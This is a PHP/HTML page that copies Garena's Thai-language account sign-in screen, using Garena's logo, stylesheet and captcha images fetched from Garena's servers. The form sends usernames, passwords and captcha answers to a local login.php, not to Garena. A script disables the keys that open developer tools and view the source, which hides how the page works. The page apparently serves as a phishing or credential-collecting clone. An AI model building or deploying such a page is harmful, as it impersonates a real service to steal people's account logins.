<!doctype html>
<?php
    require('function.php');
    $keycaps = md5(microtime_float());
    file_put_contents("captcha/captcha.png",curl("https://gop.captcha.garena.com/image?key=".$keycaps));
?>
<html>

<!-- Code by Thanh Trần. Facebook: http://fb.com/gingdev -->
<!-- Modify code By mr_temm discord mr_temm#1599 -->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="description" content="Garena">
    <link href="//auth.garena.com/css/sso.css" rel="stylesheet" type="text/css">
    <title>Garena Account Center</title>
</head>

<body>
    <div id="page">
        <div id="header" class="header">
            <div class="topBarGarena"></div>
            <div class="topBar"></div>
            <h1>
<a class="logo" href="javascript:;" target="_blank">
<img src="//auth.garena.com/images/img_garena_logo.png" style="height: 35px;">
</a>
</h1>
        </div>
        <div id="main-panel" class="mobile">
            <div class="content" style="top: 0px;">
                <h2 class="title">ลงชื่อเข้าใช้</h2>
                <form id="login-form" class="loginForm" action="login.php" method="POST"> 
                    <input id="captcha-key" name="captcha_key" type="hidden">
                    <div id="line-account" class="line">
                        <input id="sso_login_form_account" name="username" type="text" placeholder="Username อีเมล หรือ เบอร์โทรศัพท์" autocorrect="off" autocapitalize="off" required autofocus>
                    </div>
                    <div id="line-password" class="line">
                        <input id="sso_login_form_password" name="password" type="password" placeholder="รหัสผ่าน">
                    </div>
                    <div class="line clearfix" id="sso_captcha_wrap">
                        <div id="line-captcha" class="sso_captcha">
                            <input type="hidden" class="form-control" name="captcha_key" id="recut" aria-describedby="helpId" placeholder="captcha_key" value="<?php echo $keycaps; ?>">
                            <input id="input-captcha" name="captcha" type="tel" placeholder="รหัสยืนยันตน" autocorrect="off" autocapitalize="off">
                        </div>
                        <div id="sso_captcha_image" class="clearfix sso_captcha">
                            <span class="code fl"><img src="captcha/captcha.png"></span>
                            <a href="javascript:location.reload();" class="refresh fl">เปลี่ยน</a>
                        </div>
                    </div>
                    <div id="line-btn" class="line btnLine">
                        <input id="confirm-btn" name="login" type="submit" value="เข้าชื่อเข้าใช้" class="btn">
                    </div>
                    <div class="divider">
                        <span>หรือ</span>
                    </div>
                    <div id="line-btn" class="line btnLine">
                        <input id="sso_login_link_register" name="register" type="button" value="ลงทะเบียนบัญชีใหม่" class="btn black" onclick="location.href='https://sso.garena.com/ui/register?locale=vi-VN'">
                    </div>
                </form>
                <div class="linkLine">
                    <a id="sso_login_link_forget_password" href="https://account.garena.com/recovery" class="sec" target="_blank">ลืมรหัสผ่าน</a>
                </div>
            </div>
        </div>
    </div>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script src="//sso.garena.com/js/crypto.js"></script>
    <script src="sweetalert.min.js"></script>
    <script>
        document.onkeydown = function(a) {
            if (123 == event.keyCode || a.ctrlKey && a.shiftKey && 73 == a.keyCode || a.ctrlKey && a.shiftKey && 67 == a.keyCode || a.ctrlKey && a.shiftKey && 74 == a.keyCode || a.ctrlKey && 85 == a.keyCode) return !1
        };
    </script>
</body>

</html>